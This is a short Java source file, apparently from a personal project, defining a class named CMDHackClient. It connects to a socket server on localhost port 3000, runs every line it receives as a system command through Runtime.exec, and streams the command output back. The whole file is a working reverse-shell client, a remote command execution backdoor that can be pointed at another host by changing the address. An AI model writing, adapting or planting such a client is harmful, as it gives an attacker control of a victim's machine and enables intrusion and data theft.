package com.github.jasgo.cmd.client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class CMDHackClient {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("localhost", 3000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true, StandardCharsets.UTF_8);
            String command;
            while ((command = reader.readLine()) != null) {
                Runtime runtime = Runtime.getRuntime();
                Process process = runtime.exec(command.split(" "));
                BufferedReader read = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String s;
                while ((s = read.readLine()) != null) {
                    writer.println(s);
                }
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
}
